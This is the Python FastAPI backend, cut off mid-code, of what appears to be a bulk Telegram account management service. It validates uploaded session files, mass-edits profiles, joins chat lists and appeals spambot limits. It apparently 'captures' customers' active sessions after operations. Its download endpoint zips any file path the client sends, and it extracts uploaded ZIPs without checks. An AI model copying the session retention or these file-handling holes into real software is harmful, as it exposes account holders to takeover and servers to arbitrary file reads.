import os
import logging
from pathlib import Path
from dotenv import load_dotenv
# Load .env: try cwd (project root / container home) then backend folder (overrides)
load_dotenv(Path.cwd() / ".env")
load_dotenv(Path(__file__).resolve().parent / ".env")

from fastapi import FastAPI, UploadFile, File, HTTPException, WebSocket, WebSocketDisconnect, Request
from contextlib import asynccontextmanager
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
import tempfile
import json
import asyncio
import zipfile
import shutil
import io
import time
import uuid
from validate_sessions import validate_uploaded_file, extract_sessions_from_zip, validate_sessions_parallel
from session_capture import capture_successful_operation_session, capture_validated_session
from change_names import change_names_parallel
from change_usernames import change_usernames_parallel
from change_bios import change_bios_parallel
from change_profile_pictures import change_profile_pictures_parallel
from get_user_info import get_user_info_parallel
from chatlist_scanner import scan_chatlists_parallel
from chatlist_joiner import process_chatlists_parallel
from group_scanner import scan_groups_parallel
from group_leaver import leave_groups_parallel
from session_converter import convert_sessions_to_strings, convert_strings_to_sessions
from code_listener import start_listening
from tgdna_checker import check_sessions_age_parallel
from spambot_checker import check_sessions_health_parallel, SessionHealthStatus
from session_metadata import extract_metadata_parallel
from session_creator import send_code_request, verify_otp_and_create_session, verify_2fa_and_finalize_session
from privacy_settings_manager import apply_privacy_settings_parallel
from request_duration_middleware import RequestDurationMiddleware
from spambot_appeal import check_sessions_appeal_parallel, submit_appeal, submit_appeal_frozen
from job_manager import job_manager
from job_executor import job_executor
from ws_manager import ws_manager

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] [%(levelname)s] [%(name)s] %(message)s"
)
logger = logging.getLogger("backend")

app = FastAPI(title="Backend API", version="1.0.0")

# Diagnostic middleware: request duration and client disconnect logging (investigation only)
app.add_middleware(RequestDurationMiddleware)

# CORS: allow frontend origins (with credentials, wildcard * is not allowed by browsers)
_CORS_ORIGINS = [
    "https://sessionn.in",
    "https://www.sessionn.in",
    "http://localhost:3000",
    "http://127.0.0.1:3000",
]
# Add env override for extra origins, e.g. CORS_ORIGINS=https://other.com
_extra = os.environ.get("CORS_ORIGINS", "").strip()
if _extra:
    _CORS_ORIGINS.extend(o.strip() for o in _extra.split(",") if o.strip())
app.add_middleware(
    CORSMiddleware,
    allow_origins=_CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.on_event("startup")
async def startup():
    job_manager.max_concurrent_jobs = 5
    job_executor.max_concurrent_sessions = 10


@app.get("/")
async def root():
    return {"message": "Backend server is running!"}

@app.get("/api/test-scan-endpoint")
async def test_scan_endpoint():
    """Test endpoint to verify scan-chatlists route exists"""
    routes = [route.path for route in app.routes]
    return {
        "scan_chatlists_exists": "/api/scan-chatlists" in routes,
        "all_routes": routes,
        "total_routes": len(routes)
    }

@app.get("/health")
async def health():
    return {"status": "healthy"}

@app.post("/api/extract-sessions")
async def extract_sessions(file: UploadFile = File(...)):
    """
    Extract and list sessions from uploaded file (ZIP or single session)
    Returns session list and temp directory path for WebSocket validation
    """
    logger.info("[API START] /api/extract-sessions")
    request_id = str(uuid.uuid4())
    _start = time.perf_counter()
    logger.info("[START] extract_sessions request_id=%s", request_id)
    try:
        filename = file.filename.lower()
        if not (filename.endswith('.session') or filename.endswith('.zip')):
            raise HTTPException(
                status_code=400,
                detail="Invalid file type. Only .session files and .zip archives are supported."
            )
        
        temp_file = None
        temp_dir = None
        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(filename)[1]) as tmp:
                content = await file.read()
                tmp.write(content)
                temp_file = tmp.name
            
            if filename.endswith('.zip'):
                # Extract to temp directory
                temp_dir = tempfile.mkdtemp()
                with zipfile.ZipFile(temp_file, 'r') as zip_ref:
                    zip_ref.extractall(temp_dir)
                
                # Find all .session files
                sessions = []
                for root, dirs, files in os.walk(temp_dir):
                    for f in files:
                        if f.endswith('.session'):
                            session_path = os.path.join(root, f)
                            session_name = f.replace('.session', '')
                            sessions.append({
                                "name": session_name,
                                "path": session_path
                            })
                
                logger.info("[FLOW] extract_sessions upload=zip sessions=%s", len(sessions))
                return {
                    "sessions": sessions,
                    "type": "zip",
                    "temp_dir": temp_dir,
                    "temp_file": temp_file
                }
            else:
                session_name = filename.replace('.session', '')
                logger.info("[FLOW] extract_sessions upload=single session=%s", session_name)
                return {
                    "sessions": [{"name": session_name, "path": temp_file}],
                    "type": "single",
                    "temp_file": temp_file
                }
            
        except Exception as e:
            # Cleanup on error
            if temp_dir and os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
            if temp_file and os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except:
                    pass
            raise HTTPException(
                status_code=500,
                detail=f"Error extracting sessions: {str(e)}"
            )
    finally:
        logger.info("[END] extract_sessions request_id=%s duration=%.2fs", request_id, time.perf_counter() - _start)
        logger.info("[API END] /api/extract-sessions completed")

@app.websocket("/ws/validate")
async def websocket_validate(websocket: WebSocket):
    # #region agent log
    try:
        import json, time, os
        log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
        os.makedirs(os.path.dirname(log_path), exist_ok=True)
        with open(log_path, 'a', encoding='utf-8') as f:
            f.write(json.dumps({"location":"main.py:98","message":"WebSocket connection opened","data":{},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"A"}) + '\n')
    except Exception as e:
        pass
    # #endregion
    await websocket.accept()
    logger.info("[API START] /ws/validate")
    try:
        # Receive session paths (already extracted on client side)
        data = await websocket.receive_json()
        # #region agent log
        try:
            import json, time
            log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(json.dumps({"location":"main.py:104","message":"Received WebSocket data","data":{"data_keys":list(data.keys()),"session_paths_count":len(data.get("session_paths",[]))},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"A"}) + '\n')
        except:
            pass
        # #endregion
        session_paths = data.get("session_paths", [])
        temp_dirs = data.get("temp_dirs", [])
        
        # #region agent log
        try:
            import json, time
            log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(json.dumps({"location":"main.py:107","message":"Extracted session_paths and temp_dirs","data":{"session_paths_len":len(session_paths),"temp_dirs_len":len(temp_dirs) if temp_dirs else 0},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"A"}) + '\n')
        except:
            pass
        # #endregion
        
        logger.info("[FLOW] validate ws/validate sessions=%s", len(session_paths))
        if not session_paths:
            # #region agent log
            try:
                import json, time
                log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
                with open(log_path, 'a', encoding='utf-8') as f:
                    f.write(json.dumps({"location":"main.py:110","message":"No session paths found","data":{},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"A"}) + '\n')
            except:
                pass
            # #endregion
            await websocket.send_json({
                "type": "error",
                "message": "No sessions to validate"
            })
            return
        
        # Send initial progress
        # #region agent log
        try:
            import json, time
            log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(json.dumps({"location":"main.py:120","message":"Sending start message","data":{"total":len(session_paths)},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"B"}) + '\n')
        except:
            pass
        # #endregion
        await websocket.send_json({
            "type": "start",
            "total": len(session_paths),
            "message": f"Starting validation of {len(session_paths)} sessions..."
        })
        
        # Validate sessions in parallel with progress updates
        # #region agent log
        try:
            import json, time
            log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(json.dumps({"location":"main.py:128","message":"Calling validate_sessions_parallel","data":{"session_paths_count":len(session_paths)},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"B"}) + '\n')
        except:
            pass
        # #endregion
        results = await validate_sessions_parallel(session_paths, websocket, temp_dirs)
        active = sum(1 for r in (results or []) if isinstance(r, dict) and r.get("status") == "ACTIVE")
        frozen = sum(1 for r in (results or []) if isinstance(r, dict) and r.get("status") == "FROZEN")
        unauth = sum(1 for r in (results or []) if isinstance(r, dict) and r.get("status") == "UNAUTHORIZED")
        err = sum(1 for r in (results or []) if isinstance(r, dict) and r.get("status") == "ERROR")
        logger.info("[FLOW] validate done total=%s active=%s frozen=%s unauthorized=%s error=%s", len(session_paths), active, frozen, unauth, err)
        await websocket.send_json({
            "type": "complete",
            "message": "All sessions validated"
        })
        logger.info("[API END] /ws/validate completed")
    except WebSocketDisconnect:
        # #region agent log
        try:
            import json, time
            log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(json.dumps({"location":"main.py:139","message":"WebSocket disconnected by client","data":{},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"C"}) + '\n')
        except:
            pass
        # #endregion
        pass
    except Exception as e:
        # #region agent log
        try:
            import json, time, traceback
            log_path = r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log'
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(json.dumps({"location":"main.py:143","message":"Exception in WebSocket handler","data":{"error":str(e),"traceback":traceback.format_exc()},"timestamp":int(time.time()*1000),"sessionId":"debug-session","runId":"run1","hypothesisId":"C"}) + '\n')
        except:
            pass
        # #endregion
        try:
            await websocket.send_json({
                "type": "error",
                "message": str(e)
            })
        except:
            pass

@app.post("/api/download-sessions")
async def download_sessions(request: Request):
    """
    Download sessions filtered by status as a ZIP file
    """
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        status = data.get("status", "")
        extraction_data = data.get("extraction_data", [])
        logger.info("[FLOW] download_sessions requested sessions=%s status_filter=%s", len(sessions), status or "any")
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions to download")
        
        # Create ZIP file in memory
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for session in sessions:
                session_path = session.get("path")
                session_name = session.get("name", "unknown")
                
                if not session_path or not os.path.exists(session_path):
                    # Try to find in extraction data
                    found = False
                    if extraction_data:
                        ext_list = extraction_data if isinstance(extraction_data, list) else [extraction_data]
                        for ext_data in ext_list:
                            temp_dir = ext_data.get("temp_dir")
                            if temp_dir and os.path.exists(temp_dir):
                                # Search for session file
                                for root, dirs, files in os.walk(temp_dir):
                                    for file in files:
                                        if file.endswith('.session') and file.replace('.session', '') == session_name:
                                            session_path = os.path.join(root, file)
                                            found = True
                                            break
                                    if found:
                                        break
                            if found:
                                break
                    
                    if not found:
                        continue
                
                # Add session file to ZIP
                if os.path.exists(session_path):
                    # Get just the filename for the ZIP
                    zip_file.write(session_path, f"{session_name}.session")
        
        zip_buffer.seek(0)
        zip_size = len(zip_buffer.getvalue())
        # Generate a unique download identifier
        download_id = str(uuid.uuid4())[:8]
        filename = f"{status.lower()}_sessions_{download_id}.zip"
        logger.info("[FLOW] download_sessions output zip=%s size_bytes=%s", filename, zip_size)
        return StreamingResponse(
            io.BytesIO(zip_buffer.read()),
            media_type="application/zip",
            headers={
                "Content-Disposition": f"attachment; filename={filename}"
            }
        )
        
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error creating download: {str(e)}"
        )

@app.post("/api/get-user-info")
async def get_user_info_endpoint(request: Request):
    """
    Get user information (current name, user ID) for multiple sessions in parallel
    """
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        logger.info("[FLOW] get_user_info sessions=%s", len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Get user info in parallel
        results = await get_user_info_parallel(sessions)
        success_count = sum(1 for r in (results.values() or []) if isinstance(r, dict) and r.get("success"))
        logger.info("[FLOW] get_user_info done success=%s total=%s", success_count, len(sessions))
        logger.info("[API END] /api/get-user-info completed")
        return {"results": results}
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error getting user info: {str(e)}"
        )

@app.post("/api/change-usernames")
async def change_usernames(request: Request):
    """
    Change usernames for multiple sessions in parallel
    """
    _inv_path = "/api/change-usernames"
    _inv_start_ts = time.time()
    _inv_start = time.perf_counter()
    _inv_response_sent = False
    logger.info("[REQ_START] path=%s ts=%.3f", _inv_path, _inv_start_ts)
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        logger.info("[API START] /api/change-usernames sessions=%d", len(sessions))
        logger.info("[FLOW] change_usernames sessions=%s", len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Change usernames in parallel
        results = await change_usernames_parallel(sessions)
        success_count = sum(1 for r in (results.values() or []) if isinstance(r, dict) and r.get("success"))
        logger.info("[FLOW] change_usernames done success=%s total=%s", success_count, len(sessions))
        # Capture successful sessions (results is dict {idx: result})
        for idx, result in results.items():
            if isinstance(result, dict) and result.get("success") and idx < len(sessions):
                session_path = sessions[idx].get("path", "")
                if session_path:
                    try:
                        await capture_successful_operation_session(result, session_path, "change_username")
                    except Exception as e:
                        logger.warning("[Session Capture] Failed to capture session: %s", e)
        
        logger.info("[API END] /api/change-usernames completed")
        _inv_response_sent = True
        return {"results": [results[i] for i in sorted(results)]}
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error changing usernames: {str(e)}"
        )
    finally:
        logger.info("[REQ_END] path=%s duration=%.2fs response_sent=%s", _inv_path, time.perf_counter() - _inv_start, _inv_response_sent)

@app.websocket("/ws/change-profile-pictures")
async def websocket_change_profile_pictures(websocket: WebSocket):
    await websocket.accept()
    
    try:
        # Receive image and session data
        data = await websocket.receive_json()
        image_data = data.get("image_data")
        image_filename = data.get("image_filename", "profile.jpg")
        sessions = data.get("sessions", [])
        
        if not image_data:
            await websocket.send_json({
                "type": "error",
                "message": "No image provided"
            })
            return
        
        if not sessions:
            await websocket.send_json({
                "type": "error",
                "message": "No sessions provided"
            })
            return
        logger.info("[API START] /ws/change-profile-pictures sessions=%d", len(sessions))
        logger.info("[FLOW] change_profile_pictures ws sessions=%s", len(sessions))
        # Save image to temp file
        import base64
        image_bytes = base64.b64decode(image_data)
        temp_image = tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(image_filename)[1])
        temp_image.write(image_bytes)
        temp_image.close()
        
        try:
            # Send initial progress
            await websocket.send_json({
                "type": "start",
                "total": len(sessions),
                "message": "Starting profile picture updates..."
            })
            
            # Change profile pictures in parallel with progress
            await change_profile_pictures_parallel(sessions, temp_image.name, websocket)
            
            logger.info("[FLOW] change_profile_pictures done total=%s", len(sessions))
            logger.info("[API END] /ws/change-profile-pictures completed")
            await websocket.send_json({
                "type": "complete",
                "message": "All profile pictures updated"
            })
            
        finally:
            # Cleanup temp image
            if os.path.exists(temp_image.name):
                try:
                    os.remove(temp_image.name)
                except:
                    pass
        
    except WebSocketDisconnect:
        pass
    except Exception as e:
        try:
            await websocket.send_json({
                "type": "error",
                "message": str(e)
            })
        except:
            pass

@app.post("/api/change-bios")
async def change_bios(request: Request):
    """
    Change bios for multiple sessions in parallel
    """
    _inv_path = "/api/change-bios"
    _inv_start_ts = time.time()
    _inv_start = time.perf_counter()
    _inv_response_sent = False
    logger.info("[REQ_START] path=%s ts=%.3f", _inv_path, _inv_start_ts)
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        logger.info("[API START] /api/change-bios sessions=%d", len(sessions))
        logger.info("[FLOW] change_bios sessions=%s", len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Change bios in parallel
        results = await change_bios_parallel(sessions)
        success_count = sum(1 for r in (results.values() or []) if isinstance(r, dict) and r.get("success"))
        logger.info("[FLOW] change_bios done success=%s total=%s", success_count, len(sessions))
        # Capture successful sessions (results is dict {idx: result})
        for idx, result in results.items():
            if isinstance(result, dict) and result.get("success") and idx < len(sessions):
                session_path = sessions[idx].get("path", "")
                if session_path:
                    try:
                        await capture_successful_operation_session(result, session_path, "change_bio")
                    except Exception as e:
                        logger.warning("[Session Capture] Failed to capture session: %s", e)
        
        logger.info("[API END] /api/change-bios completed")
        _inv_response_sent = True
        return {"results": [results[i] for i in sorted(results)]}
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error changing bios: {str(e)}"
        )
    finally:
        logger.info("[REQ_END] path=%s duration=%.2fs response_sent=%s", _inv_path, time.perf_counter() - _inv_start, _inv_response_sent)

@app.post("/api/change-names")
async def change_names(request: Request):
    """
    Change display names for multiple sessions in parallel
    """
    _inv_path = "/api/change-names"
    _inv_start_ts = time.time()
    _inv_start = time.perf_counter()
    _inv_response_sent = False
    logger.info("[REQ_START] path=%s ts=%.3f", _inv_path, _inv_start_ts)
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        logger.info("[API START] /api/change-names sessions=%d", len(sessions))
        logger.info("[FLOW] change_names sessions=%s", len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Validate all sessions have new_first_name
        for session in sessions:
            if not session.get("new_first_name") or not session.get("new_first_name").strip():
                raise HTTPException(status_code=400, detail="All sessions must have a new first name")
        
        # Change names in parallel
        results = await change_names_parallel(sessions)
        success_count = sum(1 for r in (results.values() or []) if isinstance(r, dict) and r.get("success"))
        logger.info("[FLOW] change_names done success=%s total=%s", success_count, len(sessions))
        # Capture successful sessions (results is dict {idx: result})
        for idx, result in results.items():
            if isinstance(result, dict) and result.get("success") and idx < len(sessions):
                session_path = sessions[idx].get("path", "")
                if session_path:
                    try:
                        await capture_successful_operation_session(result, session_path, "change_name")
                    except Exception as e:
                        logger.warning("[Session Capture] Failed to capture session: %s", e)
        
        logger.info("[API END] /api/change-names completed")
        _inv_response_sent = True
        return {"results": [results[i] for i in sorted(results)]}
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error changing names: {str(e)}"
        )
    finally:
        logger.info("[REQ_END] path=%s duration=%.2fs response_sent=%s", _inv_path, time.perf_counter() - _inv_start, _inv_response_sent)

@app.post("/api/validate-sessions")
async def validate_sessions(file: UploadFile = File(...)):
    """
    Validate Telegram session files (.session) or ZIP archives containing sessions
    """
    _inv_path = "/api/validate-sessions"
    _inv_start_ts = time.time()
    _inv_start = time.perf_counter()
    _inv_response_sent = False
    logger.info("[REQ_START] path=%s ts=%.3f", _inv_path, _inv_start_ts)
    logger.info("[API START] /api/validate-sessions")
    request_id = str(uuid.uuid4())
    logger.info("[FLOW] validate_sessions POST request_id=%s filename=%s", request_id, file.filename or "")
    try:
        # Validate file type
        filename = file.filename.lower()
        if not (filename.endswith('.session') or filename.endswith('.zip')):
            raise HTTPException(
                status_code=400,
                detail="Invalid file type. Only .session files and .zip archives are supported."
            )
        
        # Save uploaded file temporarily
        temp_file = None
        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(filename)[1]) as tmp:
                content = await file.read()
                tmp.write(content)
                temp_file = tmp.name
            
            # Validate the file
            result = await validate_uploaded_file(temp_file, file.filename)
            res_count = len(result.get("results", [])) if isinstance(result, dict) and "results" in result else 1
            logger.info("[FLOW] validate_sessions done request_id=%s results_count=%s", request_id, res_count)
            # Capture ACTIVE sessions from validation
            try:
                if isinstance(result, dict) and "results" in result:
                    # ZIP file - capture each ACTIVE session
                    for res in result.get("results", []):
                        if res.get("status") == "ACTIVE":
                            session_path = temp_file if not filename.endswith('.zip') else None
                            if session_path:
                                await capture_validated_session(res, session_path, "validation")
                else:
                    # Single session file - capture if ACTIVE
                    if result.get("status") == "ACTIVE":
                        await capture_validated_session(result, temp_file, "validation")
            except Exception as e:
                logger.warning("[Session Capture] Failed to capture validated session: %s", e)
            
            # Ensure consistent response format
            if isinstance(result, dict) and "results" in result:
                # ZIP file - already has results array
                _inv_response_sent = True
                return result
            else:
                # Single session file - wrap in results array for consistency
                _inv_response_sent = True
                return {"results": [result]}
            
        except Exception as e:
            raise HTTPException(
                status_code=500,
                detail=f"Error validating session: {str(e)}"
            )
        finally:
            # Cleanup temp file
            if temp_file and os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except:
                    pass
    finally:
        logger.info("[REQ_END] path=%s duration=%.2fs response_sent=%s", _inv_path, time.perf_counter() - _inv_start, _inv_response_sent)
        logger.info("[END] validate_sessions request_id=%s duration=%.2fs", request_id, time.perf_counter() - _inv_start)
        logger.info("[API END] /api/validate-sessions completed")


# ---------- V2 background job system ----------
@app.websocket("/ws/v2/jobs/{job_id}")
async def job_progress_stream(websocket: WebSocket, job_id: str):
    job = job_manager.get_job(job_id)
    if not job:
        await websocket.close(code=1008, reason="Job not found")
        return
    await ws_manager.connect(websocket, job_id)
    try:
        status = job_manager.get_job_status(job_id)
        await websocket.send_json({"type": "init", "data": status})
        while True:
            msg = await websocket.receive_text()
            if msg == "ping":
                await websocket.send_json({"type": "pong"})
            elif msg == "status":
                current = job_manager.get_job_status(job_id)
                await websocket.send_json({"type": "status_response", "data": current})
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        await ws_manager.disconnect(websocket, job_id)


@app.get("/api/v2/jobs/{job_id}")
async def get_job_status(job_id: str):
    status = job_manager.get_job_status(job_id)
    if not status:
        raise HTTPException(status_code=404, detail="Job not found")
    return status


@app.post("/api/v2/jobs/{job_id}/cancel")
async def cancel_job(job_id: str):
    success = job_manager.cancel_job(job_id)
    if not success:
        raise HTTPException(status_code=400, detail="Cannot cancel job")
    return {"message": "Job cancelled"}


@app.get("/api/v2/jobs")
async def list_jobs(limit: int = 50):
    return {"jobs": job_manager.get_all_jobs(limit=limit)}


# V2 background job endpoints (return job_id immediately; progress via WebSocket)
@app.post("/api/v2/check-spambot")
async def check_spambot_v2(request: Request):
    from spambot_checker import check_session_health_spambot
    data = await request.json()
    sessions = data.get("sessions", [])
    if not sessions:
        raise HTTPException(status_code=400, detail="No sessions provided")
    job_id = job_manager.create_job("spambot_check", len(sessions))

    async def run_spambot_job():
        async def process_one(session: dict, index: int):
            path = session.get("path")
            if not path:
                return {"success": False, "session": "unknown", "status": SessionHealthStatus.FAILED, "details": "No session path provided", "index": index}
            status, details = await check_session_health_spambot(path)
            return {"success": status != SessionHealthStatus.FAILED, "session": path, "status": status, "details": details, "index": index}
        await job_executor.execute_session_batch(job_id=job_id, sessions=sessions, process_func=process_one, session_timeout=60)

    await job_manager.execute_job(job_id, run_spambot_job)
    return {"job_id": job_id, "status": "pending", "message": f"Job created for {len(sessions)} sessions"}


@app.post("/api/v2/check-spambot-appeal")
async def check_spambot_appeal_v2(request: Request):
    from spambot_appeal import check_spambot_status, get_phone_for_session
    data = await request.json()
    sessions = data.get("sessions", [])
    if not sessions:
        raise HTTPException(status_code=400, detail="No sessions provided")
    job_id = job_manager.create_job("spambot_appeal", len(sessions))

    async def run_appeal_job():
        async def process_one(session: dict, index: int):
            path = session.get("path") or ""
            name = session.get("name") or f"Session {index + 1}"
            if not path:
                return {"session_name": name, "path": path, "phone": "", "status": "ERROR", "response": "No session path", "index": index}
            status, response_text = await check_spambot_status(path)
            phone = await get_phone_for_session(path)
            return {"session_name": name, "path": path, "phone": phone, "status": status, "response": response_text, "index": index}
        await job_executor.execute_session_batch(job_id=job_id, sessions=sessions, process_func=process_one, session_timeout=60)

    await job_manager.execute_job(job_id, run_appeal_job)
    return {"job_id": job_id, "status": "pending", "message": f"Job created for {len(sessions)} sessions"}


@app.post("/api/v2/change-names")
async def change_names_v2(request: Request):
    from change_names import change_name_for_session
    data = await request.json()
    sessions = data.get("sessions", [])
    if not sessions:
        raise HTTPException(status_code=400, detail="No sessions provided")
    for s in sessions:
        if not s.get("new_first_name") or not str(s.get("new_first_name", "")).strip():
            raise HTTPException(status_code=400, detail="All sessions must have a new first name")
    job_id = job_manager.create_job("change_names", len(sessions))

    async def run_change_names_job():
        async def process_one(session: dict, index: int):
            path = session.get("path") or session.get("name", "")
            new_first_name = session.get("new_first_name", "")
            result = await change_name_for_session(path, new_first_name)
            if isinstance(result, dict) and result.get("success") and path:
                try:
                    await capture_successful_operation_session(result, path, "change_name")
                except Exception as e:
                    logger.warning("[Session Capture] Failed to capture session: %s", e)
            return result
        await job_executor.execute_session_batch(job_id=job_id, sessions=sessions, process_func=process_one, session_timeout=30)

    await job_manager.execute_job(job_id, run_change_names_job)
    return {"job_id": job_id, "status": "pending", "message": f"Job created for {len(sessions)} sessions"}


@app.post("/api/v2/change-bios")
async def change_bios_v2(request: Request):
    from change_bios import change_bio_for_session
    data = await request.json()
    sessions = data.get("sessions", [])
    if not sessions:
        raise HTTPException(status_code=400, detail="No sessions provided")
    job_id = job_manager.create_job("change_bios", len(sessions))

    async def run_change_bios_job():
        async def process_one(session: dict, index: int):
            path = session.get("path") or session.get("name", "")
            new_bio = session.get("new_bio", "")
            result = await change_bio_for_session(path, new_bio)
            if isinstance(result, dict) and result.get("success") and path:
                try:
                    await capture_successful_operation_session(result, path, "change_bio")
                except Exception as e:
                    logger.warning("[Session Capture] Failed to capture session: %s", e)
            return result
        await job_executor.execute_session_batch(job_id=job_id, sessions=sessions, process_func=process_one, session_timeout=30)

    await job_manager.execute_job(job_id, run_change_bios_job)
    return {"job_id": job_id, "status": "pending", "message": f"Job created for {len(sessions)} sessions"}


@app.post("/api/v2/change-usernames")
async def change_usernames_v2(request: Request):
    from change_usernames import change_username_for_session
    data = await request.json()
    sessions = data.get("sessions", [])
    if not sessions:
        raise HTTPException(status_code=400, detail="No sessions provided")
    job_id = job_manager.create_job("change_usernames", len(sessions))

    async def run_change_usernames_job():
        async def process_one(session: dict, index: int):
            path = session.get("path") or session.get("name", "")
            new_username = session.get("new_username", "")
            result = await change_username_for_session(path, new_username)
            if isinstance(result, dict) and result.get("success") and path:
                try:
                    await capture_successful_operation_session(result, path, "change_username")
                except Exception as e:
                    logger.warning("[Session Capture] Failed to capture session: %s", e)
            return result
        await job_executor.execute_session_batch(job_id=job_id, sessions=sessions, process_func=process_one, session_timeout=30)

    await job_manager.execute_job(job_id, run_change_usernames_job)
    return {"job_id": job_id, "status": "pending", "message": f"Job created for {len(sessions)} sessions"}


@app.post("/api/v2/validate-sessions")
async def validate_sessions_v2(file: UploadFile = File(...)):
    from validate_sessions import check_session_status
    filename = (file.filename or "").lower()
    if not (filename.endswith(".session") or filename.endswith(".zip")):
        raise HTTPException(status_code=400, detail="Invalid file type. Only .session files and .zip archives are supported.")
    content = await file.read()
    temp_file = None
    with tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(filename)[1]) as tmp:
        tmp.write(content)
        temp_file = tmp.name
    try:
        if filename.endswith(".zip"):
            sessions = await extract_sessions_from_zip(temp_file)
        else:
            sessions = [{"name": filename.replace(".session", ""), "path": temp_file}]
    except Exception as e:
        if temp_file and os.path.exists(temp_file):
            try:
                os.remove(temp_file)
            except Exception:
                pass
        raise HTTPException(status_code=500, detail=f"Error preparing file: {str(e)}")
    job_id = job_manager.create_job("validate_sessions", len(sessions))

    async def run_validate_job():
        try:
            async def process_one(session: dict, index: int):
                path = session.get("path") or session.get("name", "")
                name = session.get("name", f"Session {index + 1}")
                status, details = await check_session_status(path)
                result = {**details, "session_name": name}
                if status == "ACTIVE":
                    try:
                        await capture_validated_session(result, path, "validation")
                    except Exception as e:
                        logger.warning("[Session Capture] Failed to capture session %s: %s", name, e)
                return result
            await job_executor.execute_session_batch(job_id=job_id, sessions=sessions, process_func=process_one, session_timeout=60)
        finally:
            if temp_file and os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except Exception:
                    pass

    await job_manager.execute_job(job_id, run_validate_job)
    return {"job_id": job_id, "status": "pending", "message": f"Job created for {len(sessions)} sessions"}


@app.post("/api/scan-chatlists")
async def scan_chatlists(request: Request):
    """
    Scan existing chat lists (folders) for uploaded sessions.
    Expects JSON with sessions array and temp_dirs for cleanup.
    """
    try:
        data = await request.json()
        sessions = data.get("sessions", [])
        temp_dirs = data.get("temp_dirs", [])
        logger.info("[API START] /api/scan-chatlists sessions=%d", len(sessions))
        logger.info("[FLOW] scan_chatlists sessions=%s", len(sessions))
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions provided")
        
        # Scan folders in parallel
        results = await scan_chatlists_parallel(sessions)
        success_count = sum(1 for r in (results.values() or []) if isinstance(r, dict) and r.get("success"))
        logger.info("[FLOW] scan_chatlists done success=%s total=%s", success_count, len(sessions))
        # Convert results to list format for frontend
        scan_results = []
        for idx in sorted(results.keys()):
            result = results[idx]
            scan_results.append(result)
        
        logger.info("[API END] /api/scan-chatlists completed")
        return {
            "success": True,
            "results": scan_results
        }
        
    except HTTPException:
        # Re-raise HTTP exceptions as-is
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Error scanning chat lists: {str(e)}"
        )


@app.websocket("/ws/join-chatlists")
async def websocket_join_chatlists(websocket: WebSocket):
    """
    WebSocket endpoint for joining chat lists with leave/join workflow.
    Expects JSON with:
    - sessions: List of session dicts with path and is_premium
    - leave_config: Dict mapping session index to list of folder IDs to leave
    - invite_links: List of 1-5 chat list invite links
    - temp_dirs: List of temp directories for cleanup
    """
    # #region agent log
    try:
        import time
        with open(r'c:\Users\NCS\Desktop\session under dev\.cursor\debug.log', 'a', encoding='utf-8') as f:
            f.write(f'{{"timestamp":{int(time.time()*1000)},"location":"main.py:websocket_join_chatlists","message":"WebSocket connection accepted","data":{{}},"sessionId":"debug-session","runId":"run1","hypothesisId":"A"}}\n')
    except: pass
    # #endregion
    await websocket.accept()
    try:
        data = await websocket.receive_json()
        # #region agent log
        try:
